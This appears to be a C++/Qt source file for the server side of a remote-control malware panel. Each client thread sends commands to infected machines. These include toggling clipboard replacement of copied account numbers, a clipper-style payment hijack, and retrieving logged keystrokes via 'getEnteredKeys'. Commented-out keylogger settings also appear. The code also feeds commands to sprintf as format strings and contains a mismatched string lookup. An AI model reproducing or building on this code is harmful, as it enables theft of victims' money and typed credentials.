#include "serverandclient.h"
#include <winsock2.h>
#include <process.h>
#include <iostream>
#include <QDebug>
#include <Windows.h>

serverAndClient::serverAndClient(QObject *parent, const int idNumber, const int clientIdIn, bool stopThread):
    QThread(parent), Stop(stopThread),clientId(clientIdIn), idNum(idNumber)
{
    this->needToSendAgain = "";
    this->newCommand = "";
    this->needToChangeAccountNumber = false;
    this->oldNeedToChangeAccountNumber = false;
    this->accountNumberToChange = "";

//    this->needToChangeKeylogger = false;
//    this->oldNeedToChangeKeylogger = false;

    this->iResult = 1;
    this->canContinue = true;
}

std::string serverAndClient::convertToString(char* a, int size)
{
    int i;
    std::string s = "";
    for (i = 0; i < size; i++) {
        s = s + a[i];
    }
    return s;
}

void serverAndClient::run(){
    //SEND SOMETHING TO CLIENT
//    SOCKET Client = *(this->client_socket);
    printf("Client connected\n");
    emit appendConsoleLogClientServer("Client, id: " + std::to_string(clientId), "connected");
    char ptr_to_send[200] = "";
    std::string toSendStr = "";
    std::string toRecvStr = "";
    do {
        if(this->Stop == true){
            sprintf(ptr_to_send,"exit");
        }
        else if(this->newCommand != ""){
            sprintf(ptr_to_send,this->newCommand.c_str());
            this->newCommand = "";
        }
        else if(this->needToSendAgain != ""){
            sprintf(ptr_to_send,this->needToSendAgain.c_str());
            this->needToSendAgain = "";
        }
        else if(this->oldNeedToChangeAccountNumber != this->needToChangeAccountNumber && this->needToChangeAccountNumber){
            sprintf(ptr_to_send,"clipboardAutoChangeTrue");
            this->oldNeedToChangeAccountNumber = this->needToChangeAccountNumber;
        }
        else if(this->oldNeedToChangeAccountNumber != this->needToChangeAccountNumber && !this->needToChangeAccountNumber){
            sprintf(ptr_to_send,"clipboardAutoChangeFalse");
            this->oldNeedToChangeAccountNumber = this->needToChangeAccountNumber;
        }



        if(strlen(ptr_to_send) != 0 && this->canContinue){


            toSendStr = convertToString(ptr_to_send, sizeof(ptr_to_send) / sizeof(char));
            toSendStr = toSendStr.substr(0, toRecvStr.find('\0'));
            emit lastCommandChangeValue(toSendStr);
            emit appendConsoleLogClientServer("Client, id: " + std::to_string(clientId), toSendStr);
//            iResult = send(Client,ptr_to_send,200,0);
            emit sendMessageToClient(idNum, ptr_to_send);
            this->canContinue = false;
//            if (iResult == SOCKET_ERROR) {
//                printf("send failed: %d\n", WSAGetLastError());
//                WSACleanup();
//                break;
//            }
            if(toSendStr.find("exit") != std::string::npos){
                break;
            }
            else if(toSendStr.find("buffer") != std::string::npos){
                emit recieveBufferMessageFromClient(idNum);
            }
            else if(toSendStr.find("getEnteredKeys") != std::string::npos){
                emit recieveBufferMessageFromClient(idNum);
            }
        }



        toSendStr = "";
        toRecvStr = "";

    } while( this->iResult > 0 );

    emit closeClientSocket(idNum);
    emit appendConsoleLogClientServer("Client, id: " + std::to_string(clientId), "disconnected");
    emit changeCountOfClientsOnServer(-1);
    return;
}

serverAndClient::~serverAndClient()
{

}
